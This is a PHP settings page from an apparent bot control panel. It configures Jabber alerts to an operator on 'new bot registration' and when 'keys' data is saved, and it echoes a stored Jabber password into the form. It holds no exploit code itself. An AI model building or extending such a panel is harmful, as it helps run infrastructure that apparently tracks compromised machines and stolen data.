<?php 	



if(!defined('UADMIN_AB_ROOT')){die("You not have permisions");}  

$res=$sql->query("select * from sys");
$res=$res->fetchArray();
$jab=json_decode($res['jab']);
$send_on=json_decode($res['send_on']);


 ?>


<div  class="container"  style="padding-top:60px">

<ul class="nav nav-pills">
  <li role="presentation" class=""><a href="<?php echo $k_plugin->ajax_url;?>"> <span class="fa fa-arrow-left"></span> <?php echo __('Back to Panel')?></a></li>
  
</ul>




		<h3><?php echo __('Jabber setting')?></h3>
		<hr class="" style=""/>
		<form role="form" name="" onsubmit="show_loader__()" action="" method="POST" class="form">
		    <div  class="row "  style="">
					<div  class="col-sm-6 "  style="">

					<h3><?php echo __('From:')?></h3>


			<div  class="form-group "  style="">
					<label class="control-label" for=""><?php echo __('Jabber id')?></label>
					<input class="form-control" type="text" name="jabber_id" id="jabber_id"  value="<?php echo $jab->from_id?>" placeholder="" />
			</div>

			<div  class="form-group "  style="">
					<label class="control-label" for=""><?php echo __('Jabber domain')?></label>
					<input class="form-control" type="text" name="jabber_dom" id="jabber_dom" value="<?php echo $jab->from_dom?>"  placeholder="" />
			</div>

			<div  class="form-group "  style="">
					<label class="control-label" for=""><?php echo __('Jabber password')?></label>
					<input class="form-control" type="password" name="jabber_pass" id="jabber_pass" value="<?php echo $jab->from_pass?>"  placeholder="" />
			</div>
					
			<h3><?php echo __('To:')?></h3>
							<div  class="form-group "  style="">
									<label class="control-label" for=""><?php echo __('Your jabber')?></label>
									<input class="form-control" type="text" name="your_jabber" value="<?php echo $jab->to?>" id="your_jabber"  placeholder="" />
							</div>

							<div  class="form-group "  style="">
									<button class="btn btn-info" style=""><?php echo __('Save')?></button>
									<a onclick="test_jabber()" class="btn btn-warning" style=""><?php echo __('Test')?></a>
							</div>
					</div>






					<div class="col-sm-6">
						<h3><?php echo __('Send on:')?></h3>
						<div class="form-group">
							<span class="ch">
							<input type="checkbox" class="onreg" name="new_bot" id="onreg"  <?php echo $send_on->new_bot?"checked":"" ?> >
							<label for="onreg" id="new_bot" class="on__"><?php echo __('Send on New bot registration') ?></label>
						</span>
						</div><div class="form-group">
							<span class="ch">
							<input type="checkbox" class="onlogin" name="keys_saved" id="onlogin"  <?php echo $send_on->keys_saved?"checked":"" ?>>
							<label for="onlogin" id="keys_saved" class="on__"><?php echo __('Send on Data save') ?></label>
						</span>
						</div>
					</div>







			</div>
		</form>



</div>

<script type="text/javascript">
	function test_jabber () {
		 $('.loader__').show();
		 $.ajax({
		 	url:"<?php echo $k_plugin->ajax_url ?>&testjabber",
		 	dataType:"json",
		 	success:function(data){
		 		$('.loader__').hide();
		 		notify(data.mes)
		 	}
		 })
	}
</script>


